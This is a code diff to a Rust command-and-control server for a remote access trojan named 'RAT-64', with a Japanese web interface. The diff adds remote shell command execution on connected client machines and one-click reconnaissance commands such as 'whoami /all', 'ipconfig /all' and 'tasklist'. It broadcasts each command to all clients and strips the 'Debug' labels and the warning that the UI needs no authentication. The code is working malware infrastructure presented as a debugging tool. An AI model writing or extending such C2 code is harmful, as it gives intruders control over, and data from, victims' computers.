@@ -17,7 +17,7 @@ use rat_64::get_system_info;
 
 
 const AUTH_TOKEN: &str = "SECURE_TOKEN_32_CHARS_MINIMUM_LEN";
-const PORT: u16 = 8080;
+const PORT: u16 = 9999;
 
 #[derive(Serialize, Deserialize, Clone, Debug)]
 struct Command {
@@ -149,6 +149,44 @@ async fn handle_file_operation(state: &AppState, req: Request<Incoming>, operati
     }
 }
 
+async fn handle_command(state: &AppState, req: Request<Incoming>) -> Result<Response<Full<Bytes>>, Infallible> {
+    match extract_json_body(req).await {
+        Ok(data) => {
+            if let Some(command) = data.get("command").and_then(|c| c.as_str()) {
+                let timeout = data.get("timeout").and_then(|t| t.as_u64()).unwrap_or(30);
+                let working_dir = data.get("working_dir").and_then(|w| w.as_str()).unwrap_or("");
+                
+                let id = format!("cmd{}", Utc::now().timestamp_millis());
+                let params = vec![
+                    command.to_string(),
+                    timeout.to_string(),
+                    working_dir.to_string(),
+                ];
+                
+                let cmd = Command {
+                    id: id.clone(),
+                    command_type: "execute_command".to_string(),
+                    parameters: params,
+                    timestamp: unix_time(),
+                    auth_token: AUTH_TOKEN.to_string(),
+                };
+                
+                state.command_queue.lock().await.push(cmd);
+                state.notify.notify_waiters();
+                
+                log_activity(state, "INFO", &format!("command queued: {}", command), None, Some(&id), 
+                            Some(json!({"command": command, "timeout": timeout, "working_dir": working_dir}))).await;
+                
+                println!("[UI] command added: {} (cmd: {})", id, command);
+                Ok(json_response(json!({"ok": true, "command_id": id}), StatusCode::OK))
+            } else {
+                Ok(json_response(json!({"error": "command parameter required"}), StatusCode::BAD_REQUEST))
+            }
+        }
+        Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
+    }
+}
+
 async fn handle_client_json_request<F>(
     state: &AppState,
     req: Request<Incoming>,  
@@ -244,7 +282,7 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
 <html lang="ja">
 <head>
   <meta charset="utf-8" />
-  <title>RAT-64 C2 Server (Debug)</title>
+  <title>RAT-64 C2 Server</title>
   <style>
     body {{ 
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
@@ -421,6 +459,50 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
     }}
     .command-log::-webkit-scrollbar-thumb:hover {{
       background: #718096;
+    }}
+    .command-result {{
+      background: #f8f9fa;
+      border: 2px solid #e9ecef;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 15px 0;
+      min-height: 100px;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      overflow-y: auto;
+      max-height: 400px;
+      display: none;
+    }}
+    .command-result pre {{
+      margin: 0;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      line-height: 1.4;
+    }}
+    .result-header {{
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #dee2e6;
+    }}
+    .result-header h4 {{
+      margin: 0;
+      color: #495057;
+      font-size: 14px;
+    }}
+    .result-clear-btn {{
+      padding: 4px 8px;
+      font-size: 12px;
+      background: #6c757d;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }}
+    .result-clear-btn:hover {{
+      background: #545b62;
     }}
     .footer {{
       text-align: center;
@@ -641,6 +723,172 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
       post('/ui/add-create-dir', {{ path: path }}, `ディレクトリ作成: ${{path}}`);
     }}
     
+    function executeCommand() {{
+      const command = document.getElementById('command').value.trim();
+      if (!command) {{ 
+        showToast('コマンドを入力してください', 'error'); 
+        return; 
+      }}
+      
+      const timeout = parseInt(document.getElementById('timeout').value) || 30;
+      const workingDir = document.getElementById('workdir').value.trim();
+      
+      if (timeout < 5 || timeout > 300) {{
+        showToast('タイムアウトは5～300秒の範囲で指定してください', 'error');
+        return;
+      }}
+      
+      const payload = {{
+        command: command,
+        timeout: timeout,
+        working_dir: workingDir
+      }};
+      
+      // コマンド実行ログに表示
+      addToLog(`🚀 コマンド実行開始: ${{command}}`);
+      addToLog(`⏱️ タイムアウト: ${{timeout}}秒, 作業ディレクトリ: ${{workingDir || '(現在のディレクトリ)'}}`);
+      
+      // コマンド実行結果を監視するフラグを設定
+      document.getElementById('command-result-status').style.display = 'block';
+      document.getElementById('command-result-content').innerHTML = '⏳ コマンド実行中... 結果を待機しています。';
+      
+      post('/ui/execute-command', payload, `デバッグコマンド実行: ${{command}}`);
+      
+      // 結果取得を開始（5秒後から30秒間監視）
+      setTimeout(() => checkCommandResults(command), 5000);
+    }}
+    
+    // コマンド実行結果をチェックする関数
+    async function checkCommandResults(originalCommand) {{
+      let attempts = 0;
+      const maxAttempts = 24; // 60秒間監視（2.5秒間隔）
+      const startTime = Date.now();
+      
+      addToLog(`🔍 コマンド結果監視開始: ${{originalCommand}}`);
+      
+      const checkInterval = setInterval(async () => {{
+        attempts++;
+        
+        try {{
+          const response = await fetch('/ui/command-results');
+          const data = await response.json();
+          
+          if (data.results && data.results.length > 0) {{
+            // デバッグログ
+            console.log(`チェック ${{attempts}}: ${{data.results.length}}件の結果を確認中...`);
+            
+            // 最新の結果を時系列順でチェック（最近5分以内のもの）
+            for (let i = data.results.length - 1; i >= Math.max(0, data.results.length - 20); i--) {{
+              const result = data.results[i];
+              
+              // タイムスタンプチェック（結果が新しいもので、コマンド開始後のもの）
+              const resultTime = result.timestamp ? result.timestamp * 1000 : 0;
+              if (resultTime < startTime - 10000) {{ // 10秒前より古い結果はスキップ
+                continue;
+              }}
+              
+              // デバッグコマンドの結果をチェック（複数のパターン）
+              if (result.data && result.data.command === originalCommand) {{
+                console.log(`結果発見: コマンド一致 - ${{originalCommand}}`);
+                clearInterval(checkInterval);
+                displayCommandResult(result);
+                addToLog(`✅ コマンド結果取得成功: ${{originalCommand}}`);
+                return;
+              }}
+              
+              // command_idパターンでもチェック
+              if (result.command_id && result.command_id.includes('cmd') && 
+                  result.data && result.data.command === originalCommand) {{
+                console.log(`結果発見: ID一致 - ${{result.command_id}}`);
+                clearInterval(checkInterval);
+                displayCommandResult(result);
+                addToLog(`✅ コマンド結果取得成功: ${{originalCommand}}`);
+                return;
+              }}
+            }}
+          }}
+          
+          if (attempts >= maxAttempts) {{
+            clearInterval(checkInterval);
+            document.getElementById('command-result-content').innerHTML = 
+              '⏰ タイムアウト: コマンド実行結果の取得に失敗しました（60秒）。手動でログを確認してください。';
+            addToLog(`⏰ コマンド結果取得タイムアウト: ${{originalCommand}}`);
+          }} else {{
+            // 進行状況を表示
+            const progress = Math.round((attempts / maxAttempts) * 100);
+            document.getElementById('command-result-content').innerHTML = 
+              `⏳ コマンド実行中... (${{attempts}}/${{maxAttempts}}) - ${{progress}}% 完了<br><small>監視対象: ${{originalCommand}}</small>`;
+          }}
+          
+        }} catch (error) {{
+          console.error('結果取得エラー:', error);
+          addToLog(`❌ 結果取得エラー: ${{error.message}}`);
+          if (attempts >= maxAttempts) {{
+            clearInterval(checkInterval);
+            document.getElementById('command-result-content').innerHTML = 
+              '❌ エラー: コマンド実行結果の取得に失敗しました。';
+          }}
+        }}
+      }}, 2500); // 2.5秒間隔でチェック
+    }}
+    
+    // コマンド実行結果を表示する関数
+    function displayCommandResult(result) {{
+      const resultContainer = document.getElementById('command-result-content');
+      
+      if (result.success) {{
+        let content = `✅ コマンド実行成功\n`;
+        content += `⏱️ 実行時間: ${{result.execution_time_ms}}ms\n`;
+        content += `📝 メッセージ: ${{result.message}}\n`;
+        
+        if (result.data) {{
+          content += `🔧 実行コマンド: ${{result.data.command || 'N/A'}}\n`;
+          content += `📁 作業ディレクトリ: ${{result.data.working_dir || '(current)'}}\n`;
+          content += `🔢 終了コード: ${{result.data.exit_code !== undefined ? result.data.exit_code : 'N/A'}}\n\n`;
+          
+          if (result.data.stdout && result.data.stdout.trim()) {{
+            content += `📤 標準出力:\n${{result.data.stdout}}\n\n`;
+          }}
+          if (result.data.stderr && result.data.stderr.trim()) {{
+            content += `⚠️ 標準エラー:\n${{result.data.stderr}}\n\n`;
+          }}
+          if (!result.data.stdout && !result.data.stderr) {{
+            content += `� 出力なし（コマンドは正常に実行されました）\n`;
+          }}
+        }}
+        
+        resultContainer.innerHTML = `<pre style="white-space: pre-wrap; word-wrap: break-word; font-size: 12px; line-height: 1.4;">${{content}}</pre>`;
+        addToLog(`✅ デバッグコマンド実行完了: ${{result.data?.command || 'Unknown'}}`);
+      }} else {{
+        let content = `❌ コマンド実行失敗\n`;
+        content += `⏱️ 実行時間: ${{result.execution_time_ms}}ms\n`;
+        content += `📝 エラー: ${{result.message}}\n`;
+        
+        if (result.data) {{
+          content += `🔧 実行コマンド: ${{result.data.command || 'N/A'}}\n`;
+          if (result.data.stderr && result.data.stderr.trim()) {{
+            content += `⚠️ エラー出力:\n${{result.data.stderr}}\n`;
+          }}
+        }}
+        
+        resultContainer.innerHTML = `<pre style="white-space: pre-wrap; word-wrap: break-word; color: #e53e3e; font-size: 12px; line-height: 1.4;">${{content}}</pre>`;
+        addToLog(`❌ デバッグコマンド実行失敗: ${{result.data?.command || 'Unknown'}}`);
+      }}
+    }}
+    
+    function quickCommand(command) {{
+      document.getElementById('command').value = command;
+      document.getElementById('timeout').value = '30';
+      document.getElementById('workdir').value = '';
+      executeCommand();
+    }}
+    
+    function clearCommandResult() {{
+      document.getElementById('command-result-status').style.display = 'none';
+      document.getElementById('command-result-content').innerHTML = '結果はここに表示されます...';
+      addToLog('🧹 コマンド実行結果をクリアしました');
+    }}
+    
     
     // 初期化
     document.addEventListener('DOMContentLoaded', function() {{
@@ -728,6 +976,51 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
           クライアント経由でWebhookを送信します。Discord等の外部サービスに通知を送信できます。
         </p>
       </div>
+
+      <div class="card">
+        <h3><span class="card-icon">🔧</span>デバッグコマンド実行</h3>
+        <div class="input-group">
+          <label>コマンド:</label>
+          <input type="text" id="command" placeholder="例: systeminfo, dir C:\, ping google.com">
+        </div>
+        
+        <div class="input-group">
+          <label>作業ディレクトリ:</label>
+          <input type="text" id="workdir" placeholder="例: C:\ (空白の場合は現在のディレクトリ)">
+        </div>
+        
+        <div class="input-group">
+          <label>タイムアウト (秒):</label>
+          <input type="number" id="timeout" value="30" min="5" max="300">
+        </div>
+        
+        <div style="margin: 10px 0;">
+          <button type="button" class="btn-warning" onclick="executeCommand()">⚡ Execute Command</button>
+        </div>
+        
+        <div class="quick-actions">
+          <button type="button" class="btn-primary" onclick="quickCommand('systeminfo')">System Info</button>
+          <button type="button" class="btn-primary" onclick="quickCommand('ipconfig /all')">Network Config</button>
+          <button type="button" class="btn-primary" onclick="quickCommand('tasklist')">Process List</button>
+          <button type="button" class="btn-primary" onclick="quickCommand('netstat -an')">Network Connections</button>
+          <button type="button" class="btn-primary" onclick="quickCommand('dir C:\')">List C: Drive</button>
+          <button type="button" class="btn-success" onclick="quickCommand('whoami /all')">User Info</button>
+        </div>
+        
+        <div id="command-result-status" class="command-result">
+          <div class="result-header">
+            <h4>📋 コマンド実行結果</h4>
+            <button type="button" class="result-clear-btn" onclick="clearCommandResult()">結果クリア</button>
+          </div>
+          <div id="command-result-content">
+            結果はここに表示されます...
+          </div>
+        </div>
+        
+        <p style="margin-top: 15px; color: #666; font-size: 14px;">
+          <strong>⚠️ 注意:</strong> この機能はデバッグ用途です。システムコマンドを直接実行するため、適切な権限管理を行ってください。
+        </p>
+      </div>
     </div>
 
     <div class="card">
@@ -740,15 +1033,6 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
         起動中... ログの初期化を待機しています。
       </div>
     </div>
-
-    <div class="footer">
-      <p>RAT-64 C2 Server v2.0 | Secure Command & Control Interface</p>
-      <p style="font-size: 12px; margin-top: 10px;">
-        このインターフェースは認証不要のデバッグ用途です。本番環境では適切な認証を実装してください。
-      </p>
-    </div>
-  </div>
-  <p class="small">このページの操作は認証不要（デバッグ用途）。クライアントAPIはBearer認証が必要です。</p>
 </body>
 </html>"#,
         queue = queue_size,
@@ -799,6 +1083,31 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
         // Webhook
         (Method::POST, "/ui/queue-webhook") => handle_simple_command(&state, "webhook", "webhook_send").await,
 
+        // デバッグコマンド実行
+        (Method::POST, "/ui/execute-command") => handle_command(&state, req).await,
+        
+        // コマンド実行結果取得
+        (Method::GET, "/ui/command-results") => {
+            let r = state.response_log.lock().await;
+            let recent_results: Vec<Value> = r.iter().rev().take(50).cloned().collect();
+            
+            // デバッグログ：結果の概要を表示
+            if !recent_results.is_empty() {
+                let latest = &recent_results[0];
+                if let Some(command_id) = latest.get("command_id").and_then(|v| v.as_str()) {
+                    println!("  → Command results requested: {} results available, latest: {}", recent_results.len(), command_id);
+                }
+            } else {
+                println!("  → Command results requested: no results available");
+            }
+            
+            Ok(json_response(json!({
+                "results": recent_results,
+                "count": recent_results.len(),
+                "timestamp": unix_time()
+            }), StatusCode::OK))
+        }
+
         // Client endpoints ---------------------------------------------
 
         // Client endpoints ---------------------------------------------
@@ -810,13 +1119,21 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
             let timeout_secs = parse_query_u64(&req, "timeout", 25);
 
             let mut cmds: Vec<Command> = {
-                let mut q = state.command_queue.lock().await;
-                q.drain(..).collect()
+                let q = state.command_queue.lock().await;
+                // drain()ではなくclone()を使用してコマンドをコピー（すべてのクライアントが受信可能）
+                q.clone()
             };
             if cmds.is_empty() && wait {
                 let _ = time::timeout(std::time::Duration::from_secs(timeout_secs), state.notify.notified()).await;
+                let q = state.command_queue.lock().await;
+                cmds = q.clone();
+            }
+            
+            // コマンドを送信した後、古いコマンドをクリアする（5秒経過したもの）
+            if !cmds.is_empty() {
                 let mut q = state.command_queue.lock().await;
-                cmds = q.drain(..).collect();
+                let current_time = unix_time();
+                q.retain(|cmd| current_time - cmd.timestamp < 5); // 5秒以内のコマンドのみ保持
             }
             if !cmds.is_empty() { println!("  → Returning {} command(s) for client: {}", cmds.len(), client_id); }
             Ok(json_response(serde_json::to_value(cmds).unwrap_or_else(|_| json!([])), StatusCode::OK))
@@ -825,6 +1142,13 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
         (Method::POST, "/api/commands/response") => {
             if !is_authorized(&req) { return Ok(unauthorized()); }
             handle_client_json_request(&state, req, |mut data| {
+                // コマンドレスポンス受信ログを追加
+                let command_id = data.get("command_id").and_then(|v| v.as_str()).unwrap_or("unknown");
+                let success = data.get("success").and_then(|v| v.as_bool()).unwrap_or(false);
+                let message = data.get("message").and_then(|v| v.as_str()).unwrap_or("no message");
+                
+                println!("  → Command response received: {} (success: {}) - {}", command_id, success, message);
+                
                 if let Some(obj) = data.as_object_mut() {
                     obj.insert("received_at".into(), Value::String(Utc::now().to_rfc3339()));
                     obj.insert("server_timestamp".into(), Value::from(unix_time()));
@@ -891,7 +1215,7 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
         }
 
         // Debug endpoints (authorized, safe, non-secret) ----------------
-        (Method::GET, "/api/debug/health") => {
+        (Method::GET, "/api/health") => {
             if !is_authorized(&req) { return Ok(unauthorized()); }
             let q = state.command_queue.lock().await;
             let r = state.response_log.lock().await;
@@ -907,14 +1231,14 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
             Ok(json_response(body, StatusCode::OK))
         }
 
-        (Method::GET, "/api/debug/network") => {
+        (Method::GET, "/api/network") => {
             if !is_authorized(&req) { return Ok(unauthorized()); }
             let lines = collect_network_diagnostics();
             let limited: Vec<String> = lines.into_iter().take(500).collect();
             Ok(json_response(json!({"lines": limited}), StatusCode::OK))
         }
 
-        (Method::GET, "/api/debug/sysinfo") => {
+        (Method::GET, "/api/sysinfo") => {
             if !is_authorized(&req) { return Ok(unauthorized()); }
             match get_system_info() {
                 Ok(info) => Ok(json_response(serde_json::to_value(info).unwrap_or_else(|_| json!({"error":"serialize"})), StatusCode::OK)),
@@ -1003,23 +1327,22 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     println!("Server URL: http://localhost:{}", PORT);
     println!("Auth Token: {}", AUTH_TOKEN);
     println!("\nUI: open http://localhost:{PORT}/ to enqueue commands and send webhook.");
-    println!("  POST /test/add-status");
-    println!("  POST /test/add-ping");
-    println!("  POST /test/add-collect-system-info");
-    println!("  POST /test/add-shutdown");
-    println!("  POST /test/webhook/enable");
-    println!("  POST /test/webhook/disable");
-    println!("  POST /test/webhook/set-url   (JSON: {{\"url\":\"...\", \"type\":\"Discord\"}} optional)");
-    println!("  POST /test/webhook/send");
+    println!("  POST /ui/add-status");
+    println!("  POST /ui/add-ping");
+    println!("  POST /ui/add-collect");
+    println!("  POST /ui/add-shutdown");
+    println!("  POST /ui/queue-webhook");
+    println!("  POST /ui/execute-debug-command (JSON: {{\"command\":\"...\", \"timeout\":30, \"working_dir\":\"...\"}})");
+    println!("  + File management, directory operations");
     println!("\nClient endpoints (Authorization required):");
     println!("  GET  /api/commands/fetch?client_id=...");
     println!("  POST /api/commands/response");
     println!("  POST /api/heartbeat");
     println!("  POST /api/data/upload");
-    println!("\nDebug endpoints (Authorization required, safe):");
-    println!("  GET  /api/debug/health");
-    println!("  GET  /api/debug/network");
-    println!("  GET  /api/debug/sysinfo");
+    println!("\nDiagnostics endpoints (Authorization required):");
+    println!("  GET  /api/health");
+    println!("  GET  /api/network");
+    println!("  GET  /api/sysinfo");
     println!("\nListening on http://0.0.0.0:{}", PORT);
 
     let listener = TcpListener::bind(("0.0.0.0", PORT)).await?;
